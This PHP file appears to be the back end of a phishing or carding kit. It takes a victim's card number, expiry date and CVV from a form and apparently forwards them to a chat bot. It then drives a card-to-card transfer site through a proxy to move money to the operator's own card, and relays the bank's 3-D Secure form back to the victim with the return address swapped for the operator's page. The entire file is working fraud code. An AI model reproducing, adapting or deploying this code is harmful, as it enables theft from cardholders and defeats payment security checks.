<?php
include $_SERVER['DOCUMENT_ROOT'].'/config.php';
date_default_timezone_set ('Europe/Moscow');
//header('Content-Type: text/html; charset=utf-8');
//include 'config.php';
function normale_card($cardstring){
    $result = $cardstring[0].$cardstring[1].$cardstring[2].$cardstring[3].' '.$cardstring[4].$cardstring[5].$cardstring[6].$cardstring[7].' '.$cardstring[8].$cardstring[9].$cardstring[10].$cardstring[11].' '.$cardstring[12].$cardstring[13].$cardstring[14].$cardstring[15];


    return $result;

}
function getbincard($cardstring){
    $result = $cardstring[0];


    return $result;
}
getPost();
sendChatMessages($token,$bot_receiver,$chatid,$areaname);


$ch = curl_init('https://gaztransbank.dengisend.ru/');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: '.getallheaders()['User-Agent'],
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language: en-US,en;q=0.5',
    'Accept-Encoding: gzip, deflate, br',
    'Upgrade-Insecure-Requests: 1',
    'Cache-Control: max-age=0'
]);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch,CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
curl_setopt($ch, CURLOPT_HEADER, 1);
$session = curl_exec($ch);
//$tsf = curl_getinfo($ch);
curl_close($ch);

preg_match_all('#<input type="hidden" name="_csrf" value="(.+?)">#is', $session, $vertoken);


preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $session, $matches);

$cookies = array();
foreach($matches[1] as $item) {
    parse_str($item, $cookie);
    $cookies = array_merge($cookies, $cookie);
}


$coc = [];

foreach($cookies as $key=>$val){
    $coc[str_replace('_','.',$key)] = $val;

}


$params = [
    'fromCardNumber'=>	normale_card($_POST['card_number']),
    'cardDate'	=>$_POST['expm'].'/'.$_POST['expy'],
    'cvv'	=>$_POST['cvv'],
    'toCardNumber'=>	normale_card($card),
    'amount'	=>$_POST['amount'],
    '_csrf'	=>$vertoken[1][0]
];

$_SESSION['JSESSIONID'] = $coc['JSESSIONID'];

$ch = curl_init('https://gaztransbank.dengisend.ru/transfer');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: '.getallheaders()['User-Agent'],
    'Host: gaztransbank.dengisend.ru',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language: en-US,en;q=0.5',
    'Referer: https://gaztransbank.dengisend.ru/',
    'Accept-Encoding: gzip, deflate, br',
    'Upgrade-Insecure-Requests: 1',
    'Cache-Control: max-age=0',
    'Cookie: JSESSIONID='.$coc['JSESSIONID']
]);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
// curl_setopt($ch,CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
//curl_setopt($ch, CURLOPT_HEADER, 1);
$session = curl_exec($ch);
$tsf = curl_getinfo($ch);
curl_close($ch);


// ["ORDER_NUM"]=> string(20) "20200506114233015411" ["TIMESTAMP"]=> string(14) "20200506114233"





$ch = curl_init($tsf['redirect_url']);

curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'User-Agent: '.getallheaders()['User-Agent'],
    'Host: gate.payneteasy.com',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language: en-US,en;q=0.5',
    'Referer: https://gaztransbank.dengisend.ru/',
    'Accept-Encoding: gzip, deflate, br',
    'Upgrade-Insecure-Requests: 1',
    'Cache-Control: max-age=0',
    // 'Cookie: JSESSIONID='.$coc['JSESSIONID']
));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
curl_setopt($ch,CURLOPT_ENCODING, 'gzip');
// curl_setopt($ch, CURLOPT_POST, true);
//curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
$d3s = curl_exec($ch);//get commission
curl_close($ch);


// var_dump($tsf);
// var_dump($coc['JSESSIONID']);






preg_match_all('#<form name="returnform" action="(.+?)" method="POST">#is', $d3s, $action);
preg_match_all('#<input type="hidden" name="MD" value="(.+?)">#is', $d3s, $md);
preg_match_all('#<input type="hidden" name="PaReq" value="(.+?)">#is', $d3s, $PaReq);
preg_match_all('#<input type="hidden" name="TermUrl" value="(.+?)">#is', $d3s, $TermUrl);

$md_result =  str_replace('https://gate.payneteasy.com/paynet/processor/mdm-result/','',$TermUrl[1][0]);



if(!isset($PaReq[1][0])){
    echo '3дс форма не построена!';
    exit();
}
$ab = isset($_SERVER['HTTPS']) ? 'https://' . $_SERVER['SERVER_NAME'] . dirname($_SERVER['REQUEST_URI']) . '/status.php?mdresult='.$md_result : 'https://' . $_SERVER['SERVER_NAME'] . dirname($_SERVER['REQUEST_URI']) . '/status.php?mdresult='.$md_result;



?>

</html>
</body>
<form id="postForm" action="<?=$action[1][0];?>" method="POST">
    <input type="hidden" name="PaReq" value="<?=$PaReq[1][0];?>">
    <input type="hidden" name="TermUrl" value="<?=$ab;?>">
    <input type="hidden" name="MD" value="<?=$md[1][0];?>">

</form><script>document.getElementById('postForm').submit();</script></body></html>